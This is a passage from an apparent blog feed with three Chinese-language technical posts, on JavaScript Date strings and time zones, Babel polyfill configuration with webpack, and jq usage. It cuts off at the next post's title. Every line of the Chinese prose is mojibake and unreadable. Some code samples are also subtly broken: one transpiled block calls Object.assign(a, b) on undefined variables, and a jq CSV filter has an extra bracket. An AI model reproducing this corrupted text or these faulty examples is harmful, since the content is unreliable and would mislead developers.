        <content type="html"><![CDATA[<h2 id="è®¡ç®—æœºç³»ç»Ÿæ—¶é—´"><a href="#è®¡ç®—æœºç³»ç»Ÿæ—¶é—´" class="headerlink" title="è®¡ç®—æœºç³»ç»Ÿæ—¶é—´"></a>è®¡ç®—æœºç³»ç»Ÿæ—¶é—´</h2><p>æˆ‘ä»¬å¸¸è¯´çš„è®¡ç®—æœºç³»ç»Ÿï¼ˆç±»Unixç³»ç»Ÿï¼‰æ—¶é—´æ˜¯ä¸€ä¸ªç›¸å¯¹å€¼ï¼Œå®ƒè¡¨ç¤ºè·ç¦»<code>1970å¹´1æœˆ1æ—¥00:00:00</code>è¿‡å»çš„ç§’æ•°ã€‚</p><p>æ—¶é—´é€šå¸¸åœ¨ç¨‹åºä¸­æœ‰æ—¶é—´æˆ³å’Œæ—¥æœŸå­—ç¬¦ä¸²ä¸¤ç§è¡¨ç°å½¢å¼ã€‚ä½†æ˜¯åœ¨è®¡ç®—æœºä¸­å…¶å®åªæœ‰ä¸€ç§ï¼Œå°±æ˜¯æ—¶é—´æˆ³ã€‚ä½¿ç”¨æ—¶é—´æˆ³æ˜¯æ°¸è¿œä¸ä¼šå‡ºé—®é¢˜ï¼Œä½†æ˜¯ä½¿ç”¨æ—¥æœŸå­—ç¬¦ä¸²æŸäº›æ—¶å€™å°±ä¼šå‡ºç°é—®é¢˜ã€‚å‡ºç°é—®é¢˜çš„åŸå› ä¸€èˆ¬å°±æ˜¯å› ä¸ºçœç•¥äº†æ—¶åŒºã€‚</p><h3 id="æ—¶åŒº"><a href="#æ—¶åŒº" class="headerlink" title="æ—¶åŒº"></a>æ—¶åŒº</h3><p>æˆ‘ä»¬ç”Ÿæ´»ä¸­å¸¸å¸¸ç”¨æ—¥æœŸå­—ç¬¦ä¸²æ¥è¡¨ç¤ºæ—¶é—´ï¼Œå¦‚ä¸‹ï¼š</p><iframe scrolling="no" width="100%" height="300" src="https://jsfiddle.net/pLxr4mqt/embedded/result/light/" frameborder="0" loading="lazy" allowfullscreen="allowfullscreen"></iframe><p>å¯èƒ½æœ‰äº›äººåœ¨ç¨‹åºä¸­ä¹Ÿä¼šä½¿ç”¨æ—¥æœŸå­—ç¬¦ä¸²æ¥åˆå§‹åŒ–æ—¥æœŸï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Date</span>(<span class="string">&#x27;2020-08-07 18:21:33&#x27;</span>);</span><br></pre></td></tr></table></figure><p>å¾ˆå¤šæƒ…å†µä¸‹è¿™æ ·éƒ½æ²¡æœ‰é—®é¢˜ï¼Œä½†æ˜¯ä¸€æ—¦ç”¨æˆ·åˆ†å¸ƒåœ¨ä¸åŒæ—¶åŒºæˆ–ä¿®æ”¹ç³»ç»Ÿæ—¶åŒºæ—¶å°±ä¼šå‡ºç°é—®é¢˜ã€‚ä¸Šé¢çš„æ—¥æœŸå­—ç¬¦ä¸²å…¶å®éšå«äº†ä¸€ä¸ªæ¡ä»¶<code>æ—¶åŒº</code>ï¼Œæ¯”å¦‚æˆ‘ä»¬ç”Ÿæ´»ä¸­å¸¸è¯´â€œä»Šå¤©ä¸‹åˆäº”ç‚¹è§ä¸ªé¢â€è¿™é‡Œéšå«çš„æ¡ä»¶å°±æ˜¯å¤§å®¶éƒ½åœ¨ä¸œå…«åŒºã€‚</p><p>åœ¨ä¸œå…«åŒºï¼ˆåŒ—äº¬æ—¶é—´ï¼‰æ—¶ï¼Œä¸Šé¢çš„æ—¶é—´ç­‰ä»·äºè¿™ä¸ªå½¢å¼ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Date</span>(<span class="string">&#x27;2020-08-07T18:21:33+08:00&#x27;</span>);</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯åœ¨ä¸œä¹åŒºï¼ˆä¸œäº¬æ—¶é—´ï¼‰å®ƒç­‰ä»·äºï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Date</span>(<span class="string">&#x27;2020-08-07T18:21:33+09:00&#x27;</span>);</span><br></pre></td></tr></table></figure><p>è¿™ä¸¤ä¸ªæ—¶é—´å¹¶ä¸æ˜¯åŒä¸€ä¸ªæ—¥æœŸã€‚è¿™å°±æ˜¯æ—¥æœŸå­—ç¬¦ä¸²åœ¨å¤¸æ—¶åŒºå‡ºç°é—®é¢˜çš„åŸå› ã€‚</p><p>åœ¨å®é™…å¼€å‘ä¸­ï¼Œæˆ‘ä»¬åº”è¯¥é¿å…ä½¿ç”¨ç®€å•å­—ç¬¦ä¸²æ ¼å¼<code>YYYY-MM-DD HH:mm:ss</code>è¡¨ç¤ºæ—¥æœŸï¼Œè¿™æ˜¯éå¸¸å±é™©çš„ã€‚å¦‚æœè¦ä½¿ç”¨å­—ç¬¦ä¸²æ¥å­˜å‚¨å’Œåˆå§‹åŒ–æ—¥æœŸåº”è¯¥åŠ ä¸Šæ—¶åŒºï¼Œä½¿ç”¨<code>ISO 8601</code>æ ¼å¼çš„å­—ç¬¦ä¸²<code>YYYY-MM-DDTHH:mm:ss.sssZ</code>ã€‚</p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://www.wikiwand.com/zh-hans/ISO_8601">ISO 8601</a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Date/toISOString">toISOString</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Babel Webpack</title>
      <link href="/post/babel-with-webpack.html"/>
      <url>/post/babel-with-webpack.html</url>
      
        <content type="html"><![CDATA[<h2 id="Babel-Webpack"><a href="#Babel-Webpack" class="headerlink" title="Babel Webpack"></a>Babel Webpack</h2><h3 id="babel-preset-env"><a href="#babel-preset-env" class="headerlink" title="@babel&#x2F;preset-env"></a>@babel&#x2F;preset-env</h3><p>ç”¨æ¥å–ä»£ä»¥å‰çš„ <code>es2016</code>ã€<code>es2017</code>ã€<code>stage-x</code> ç­‰ç­‰ <code>preset</code>ã€å®ƒæ˜¯ä¸€ä¸ªåˆé›†ï¼ŒåŒ…å«å·²ç»æˆä¸ºæ ‡å‡†çš„ææ¡ˆã€‚å®ƒçš„<code>useBuiltIns</code>èƒ½é…ç½®å¦‚ä½•å¤„ç†<code>polyfill</code>ï¼Œç°åœ¨å·²ç»ä¸åœ¨æ¨èä½¿ç”¨<code>@babel/polyfill</code>ã€‚ä¸€èˆ¬çš„é…ç½®å¦‚ä¸‹ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;presets&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line"><span class="punctuation">[</span></span><br><span class="line"><span class="string">&quot;@babel/preset-env&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;targets&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line"><span class="string">&quot;chrome &gt;= 58&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="string">&quot;iOS &gt;= 9&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="string">&quot;Android &gt;= 5&quot;</span></span><br><span class="line"><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;useBuiltIns&quot;</span><span class="punctuation">:</span> <span class="string">&quot;usage&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;corejs&quot;</span><span class="punctuation">:</span> <span class="number">3</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><ul><li><p><code>useBuiltIns</code> ç”¨æ¥æŒ‡å®š <code>polyfill</code> å¦‚ä½•å¤„ç†ï¼Œé…åˆ <code>core-js</code>ä½¿ç”¨ï¼ˆæ¨èä½¿ç”¨<code>core-js@3</code>ï¼‰æœ‰ä»¥ä¸‹ä¸‰ä¸ªå–å€¼ï¼š</p>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> foo = &#123; <span class="attr">name</span>: <span class="string">&#x27;Ming&#x27;</span> &#125;;</span><br><span class="line"><span class="keyword">const</span> bar = &#123; <span class="attr">address</span>: <span class="string">&#x27;Beijing&#x27;</span>, <span class="attr">age</span>: <span class="string">&#x27;18&#x27;</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">assign</span>(foo, bar);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br></pre></td></tr></table></figure><ul><li><p>usage:ï¼ˆæ¨èï¼‰ä¼šæŒ‰éœ€å¼•å…¥ <code>polyfill</code></p>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;core-js/modules/es.array.iterator&quot;</span>);</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;core-js/modules/es.map&quot;</span>);</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;core-js/modules/es.object.assign&quot;</span>);</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;core-js/modules/es.object.to-string&quot;</span>);</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;core-js/modules/es.string.iterator&quot;</span>);</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;core-js/modules/web.dom-collections.iterator&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> foo = &#123;</span><br><span class="line"><span class="attr">name</span>: <span class="string">&#x27;Ming&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> bar = &#123;</span><br><span class="line"><span class="attr">address</span>: <span class="string">&#x27;Beijing&#x27;</span>,</span><br><span class="line"><span class="attr">age</span>: <span class="string">&#x27;18&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">assign</span>(a, b);</span><br><span class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br></pre></td></tr></table></figure></li><li><p>entry: ä¼šå¼•å…¥å…¨éƒ¨ <code>polyfill</code></p><blockquote><p><del>æä¸æ¸…æ¥šç»“æœä¸ºä»€ä¹ˆå’Œ <code>false</code> ä¸€æ ·ï¼Œæ‰“å¼€ <code>debug</code> é€‰é¡¹åä¼šæœ‰å¦‚ä¸‹æç¤º<code>Import of core-js was not found.</code></del></p></blockquote><blockquote><p>æ›´æ–°ï¼šéœ€è¦åœ¨ä»£ç ä¸­æ‰‹åŠ¨å¼•å…¥ <code>import &#39;core-js&#39;</code>ï¼Œç»“æœä¼šåŠ è½½éå¸¸å¤šçš„<code>polyfill</code>ã€‚</p></blockquote>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> foo = &#123;</span><br><span class="line"><span class="attr">name</span>: <span class="string">&#x27;Ming&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> bar = &#123;</span><br><span class="line"><span class="attr">address</span>: <span class="string">&#x27;Beijing&#x27;</span>,</span><br><span class="line"><span class="attr">age</span>: <span class="string">&#x27;18&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">assign</span>(foo, bar);</span><br><span class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br></pre></td></tr></table></figure></li><li><p>false: ä¸å¼•å…¥ <code>polyfill</code></p><blockquote><p><code>debug</code> æç¤º <code>Using polyfills: No polyfills were added, since the *useBuiltIns* option was not set.</code> </p></blockquote>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> foo = &#123;</span><br><span class="line"><span class="attr">name</span>: <span class="string">&#x27;Ming&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> bar = &#123;</span><br><span class="line"><span class="attr">address</span>: <span class="string">&#x27;Beijing&#x27;</span>,</span><br><span class="line"><span class="attr">age</span>: <span class="string">&#x27;18&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">assign</span>(foo, bar);</span><br><span class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br></pre></td></tr></table></figure></li></ul></li><li><p><code>targets</code> é€‰é¡¹ç”¨æ¥é…ç½®é…ç½®å…¼å®¹èŒƒå›´ï¼Œè¯­æ³•å‚è€ƒ <a href="https://github.com/browserslist/browserslist">browserslist</a></p></li><li><p><code>exclude</code> å’Œ <code>include</code> ç”¨æ¥æ’æŸ¥å’Œå¼ºåˆ¶å¼•å…¥æŸäº›<code>ployfill</code>ï¼Œä¾‹å¦‚ä¸‹ä¾‹ï¼š</p><blockquote><p>æµ‹è¯•ä¸­å‘ç°è®¾ç½® <code>&quot;in P clude&quot;: [&quot;es.set&quot;]</code> å¹¶æœªç”Ÿæ•ˆ </p></blockquote><p>  è®¾ç½® <code>&quot;exclude&quot;: [&quot;es.object.assign&quot;]</code>ï¼Œå³ä½¿æˆ‘ä»¬ä»£ç ä¸­ç”¨åˆ°äº†<code>Object.assign</code>æ–¹æ³•ï¼Œä¹Ÿä¸ä¼šè‡ªåŠ¨å¼•å…¥è¿™ä¸ª<code>polyfill</code>ã€‚</p></li></ul><h3 id="babel-plugin-transform-runtime"><a href="#babel-plugin-transform-runtime" class="headerlink" title="@babel&#x2F;plugin-transform-runtime"></a>@babel&#x2F;plugin-transform-runtime</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;presets&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line"><span class="punctuation">[</span></span><br><span class="line"><span class="string">&quot;@babel/preset-env&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;targets&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line"><span class="string">&quot;chrome &gt;= 58&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="string">&quot;iOS &gt;= 9&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="string">&quot;Android &gt;= 5&quot;</span></span><br><span class="line"><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;useBuiltIns&quot;</span><span class="punctuation">:</span> <span class="string">&quot;usage&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;plugins&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line"><span class="punctuation">[</span></span><br><span class="line"><span class="string">&quot;@babel/plugin-transform-runtime&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;corejs&quot;</span><span class="punctuation">:</span> <span class="number">3</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>ä¸€èˆ¬æƒ…å†µä¸‹ä¸éœ€è¦ï¼Œéœ€è¦é…ç½® <code>@babel/runtime</code>ï¼ˆä¸æ˜¯<strong>å¼€å‘ä¾èµ–</strong>ï¼‰ ä¸€èµ·ä½¿ç”¨ã€‚ä½¿ç”¨äº†è¿™ä¸ªåèƒ½å¤ç”¨ä¸€äº›<code>helpers</code>ä»£ç ï¼Œèƒ½é¿å…æ±¡æŸ“å…¨å±€ã€‚ä¸‹é¢æ˜¯æ‰“å¼€ä½¿ç”¨è¿™ä¸ªæ’ä»¶åçš„è½¬ä¹‰ä»£ç ï¼š</p><p>æˆ‘ä»¬çœ‹åˆ° <code>Map</code> å’Œ <code>Object.assign</code> ä¸åœ¨æ˜¯å…¨å±€çš„äº†</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> _interopRequireDefault = <span class="built_in">require</span>(<span class="string">&quot;@babel/runtime-corejs3/helpers/interopRequireDefault&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> _map = <span class="title function_">_interopRequireDefault</span>(<span class="built_in">require</span>(<span class="string">&quot;@babel/runtime-corejs3/core-js-stable/map&quot;</span>));</span><br><span class="line"><span class="keyword">var</span> _assign = <span class="title function_">_interopRequireDefault</span>(<span class="built_in">require</span>(<span class="string">&quot;@babel/runtime-corejs3/core-js-stable/object/assign&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> foo = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;Ming&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> bar = &#123;</span><br><span class="line">  <span class="attr">address</span>: <span class="string">&#x27;Beijing&#x27;</span>,</span><br><span class="line">  <span class="attr">age</span>: <span class="string">&#x27;18&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line">(<span class="number">0</span>, _assign.<span class="property">default</span>)(foo, bar);</span><br><span class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> _map.<span class="title function_">default</span>();</span><br></pre></td></tr></table></figure><h3 id="å…¶å®ƒ"><a href="#å…¶å®ƒ" class="headerlink" title="å…¶å®ƒ"></a>å…¶å®ƒ</h3><ul><li>é…åˆ<code>webpack</code>çš„ <code>splitChunks</code> å°† <code>polyfill</code> æ‰“åŒ…åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">optimization</span>: &#123;</span><br><span class="line"><span class="attr">splitChunks</span>: &#123;</span><br><span class="line"><span class="comment">// cacheGroups æŒ‡å®šæ‹†åˆ†è§„åˆ™ é»˜è®¤çš„æ‹†åˆ†è§„åˆ™å¦‚ä¸‹ &lt;https://webpack.js.org/plugins/split-chunks-plugin/#optimizationsplitchunks&gt;</span></span><br><span class="line"><span class="attr">cacheGroups</span>: &#123;</span><br><span class="line"><span class="attr">polyfill</span>: &#123;</span><br><span class="line"><span class="comment">// ä¸€ä¸ªæ­£åˆ™åŒ¹é…é‚£äº›ä»£ç é€‚ç”¨è¿™ä¸ªè§„åˆ™</span></span><br><span class="line"><span class="attr">test</span>: <span class="regexp">/core-js/</span>, </span><br><span class="line"><span class="comment">// è¡¨ç¤ºä»å“ªäº›chunksé‡Œé¢æŠ½å–ä»£ç ï¼Œé™¤äº†ä¸‰ä¸ªå¯é€‰å­—ç¬¦ä¸²å€¼ initialã€asyncã€all ä¹‹å¤–ï¼Œè¿˜å¯ä»¥é€šè¿‡å‡½æ•°æ¥è¿‡æ»¤æ‰€éœ€çš„ chunks</span></span><br><span class="line"><span class="attr">chunks</span>: <span class="string">&#x27;all&#x27;</span> </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://www.babeljs.cn/docs/babel-preset-env">@babel&#x2F;preset-env</a></li><li><a href="https://www.babeljs.cn/docs/babel-polyfill">@babel&#x2F;polyfill</a></li><li><a href="https://www.babeljs.cn/docs/babel-plugin-transform-runtime">@babel&#x2F;plugin-transform-runtime</a></li><li><a href="https://webpack.js.org/plugins/split-chunks-plugin/#splitchunkschunks">SplitChunksPlugin</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>jq</title>
      <link href="/post/jq.html"/>
      <url>/post/jq.html</url>
      
        <content type="html"><![CDATA[<h2 id="JQ"><a href="#JQ" class="headerlink" title="JQ"></a>JQ</h2><p>jq æ˜¯ä¸ªéå¸¸å¼ºå¤§çš„å¤„ç† JSON æ•°æ®çš„å‘½ä»¤è¡Œå·¥å…·ã€‚</p><h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><ul><li><p>Linux</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install jq</span><br></pre></td></tr></table></figure></li><li><p>macOS</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install jq</span><br></pre></td></tr></table></figure></li></ul><h3 id="ä½¿ç”¨ç¤ºä¾‹"><a href="#ä½¿ç”¨ç¤ºä¾‹" class="headerlink" title="ä½¿ç”¨ç¤ºä¾‹"></a>ä½¿ç”¨ç¤ºä¾‹</h3><blockquote><p>æ³¨æ„ï¼šç¤ºä¾‹æ•°æ®ä¸æ˜¯ä¸€æ®µjsonæ•°æ®ï¼Œå®ƒçš„æ¯ä¸€è¡Œéƒ½æ˜¯ä¸€æ¡jsonæ•°æ®ã€‚æ¯ä¸€è¡Œéƒ½ä¼šå¤„ç†ä¸€æ¬¡ã€‚</p></blockquote><ol><li>æ ¼å¼åŒ–</li></ol><blockquote><p>è¿™é‡Œçš„ <code>.</code> è¡¨ç¤ºå½“å‰JSONå¯¹è±¡</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s https://kekek.cc/static/jq.json | jq .</span><br></pre></td></tr></table></figure><ol start="2"><li>æŸ¥è¯¢</li></ol><blockquote><p>æŸ¥è¯¢ <code>remote_addr</code> ä¸º <code>187.141.142.230</code> çš„ç”¨æˆ·</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s https://kekek.cc/static/jq.json | jq <span class="string">&#x27;select (.[&quot;remote_addr&quot;] == &quot;187.141.142.230&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p><code>select(boolean_expression)</code> ä¸ºæŸ¥è¯¢è¯­å¥ï¼Œ<code>.[&quot;remote_addr&quot;]</code> è¡¨ç¤ºå–å¯¹è±¡çš„<code>remote_addr</code>å±æ€§ï¼ˆé™¤äº†å¯ä»¥ç”¨<code>.[]</code>å–å€¼è¿˜å¯ä»¥ç›´æ¥<code>.</code>å–å€¼ï¼Œå‰è€…å¯ä»¥å¤„ç†ç‰¹æ®Šå­—ç¬¦çš„æƒ…å†µï¼‰ã€‚ <code>==</code> è¡¨ç¤ºç­‰äºã€‚</p><blockquote><p>æŸ¥è¯¢ <code>method</code> ä¸º <code>GET</code> çš„è¯·æ±‚ï¼Œå¹¶ä¸”<code>status</code> ä¸º <code>200</code></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s https://kekek.cc/static/jq.json | jq <span class="string">&#x27;select (.[&quot;method&quot;] == &quot;GET&quot; and .status == 200)&#x27;</span></span><br></pre></td></tr></table></figure><ol start="3"><li>ç®¡é“</li></ol><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">AccessLog</span> &#123;</span><br><span class="line"><span class="attr">ip</span>: <span class="built_in">string</span>;</span><br><span class="line"><span class="attr">method</span>: <span class="built_in">string</span>;</span><br><span class="line"><span class="attr">url</span>: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s https://kekek.cc/static/jq.json | jq <span class="string">&#x27;. | &#123;ip: .[&quot;remote_addr&quot;], method: .method, url: .[&quot;request_uri&quot;]&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œä½¿ç”¨äº†ç®¡é“ç¬¦ <code>|</code> å¯ä»¥å¤šæ¬¡å¤„ç†ç»“æœ</p><ol start="4"><li>è¾“å‡ºcsvæ ¼å¼</li></ol><blockquote><p>csv çš„è¾“å…¥è¦æ±‚å¿…é¡»æ˜¯ä¸€ä¸ªæ•°ç»„</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s https://kekek.cc/static/jq.json | jq <span class="string">&#x27;. | [.[&quot;remote_addr&quot;], .method, .status]] | @csv&#x27;</span></span><br></pre></td></tr></table></figure><ol start="5"><li>æ•°ç»„</li></ol><p><code>.[]</code> è¡¨ç¤ºå–æ•´ä¸ªæ•°ç»„ï¼Œä¸€èˆ¬é…åˆç®¡é“ç¬¦å·ä¸€èµ·ä½¿ç”¨ <code>.[] | {ip: .[&quot;remote_addr&quot;], method: .method, url: .[&quot;request_uri&quot;]}</code></p><p><code>.[0]</code> è¡¨ç¤ºå–æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ </p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://stedolan.github.io/jq/tutorial/">Tutorial</a></li><li><a href="https://stedolan.github.io/jq/manual/">jq Manual</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>å¯¹5Gçš„ä¸€äº›çœ‹æ³•</title>
      <link href="/post/5G.html"/>
      <url>/post/5G.html</url>
      
